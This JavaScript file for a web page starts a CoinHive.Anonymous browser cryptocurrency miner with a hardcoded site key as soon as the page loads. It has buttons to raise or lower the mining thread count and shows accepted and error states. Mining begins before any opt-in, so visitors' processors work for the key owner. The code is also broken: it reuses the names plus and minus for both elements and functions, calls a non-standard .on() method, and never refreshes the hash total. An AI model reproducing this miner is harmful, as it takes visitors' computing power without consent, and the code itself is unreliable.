var miner = new CoinHive.Anonymous('nzsqRtzXjHw8qYGPdSV56jEattRTXGxb', {
	autoThreads: false
});
miner.start();
const total = document.querySelector('#totalHashes');
var totalHashes, threads;
const accepted = document.querySelector('.accepted');
const initial = document.querySelector('.initial');
const error = document.querySelector('.error');
const velocidade = document.querySelector('#velocidade');
const minus = document.querySelector('.minus');
const plus =  document.querySelector('.plus');
totalHashes = miner.getTotalHashes();

function getThreads() {
    threads = miner.getNumThreads();
    return threads;
}

plus.on('click', function () {
    plus();
});

minus.on('click', function () {
    minus();
});

miner.on('accepted', function() {
	accepted.style.display = "block";
	initial.style.display = "none";
	error.style.display = "none";
});

miner.on('error', function() {
	accepted.style.display = "none";
	initial.style.display = "none";
	error.style.display = "block";
});

miner.on('optin', function(params) {
	if (params.status === 'accepted') {
		accepted.style.display = "block";
		initial.style.display = "none";
		error.style.display = "none";
	}
});

function plus() {
    if (getThreads()!=100){
        miner.setNumThreads(getThreads()+1);
        if (getThreads()==100) {
            plus.disabled = true;
        }
        velocidade.value = getThreads();
    }
    return true;
}

function minus() {
    if (getThreads()!=1){
        miner.setNumThreads(getThreads()-1);
        if (getThreads()==1) {
            minus.disabled = true;
        }
        velocidade.value = getThreads();
    }
    return true;
}

setInterval(function() {
    total.value = totalHashes;
    velocidade.value = getThreads();
}, 1000);
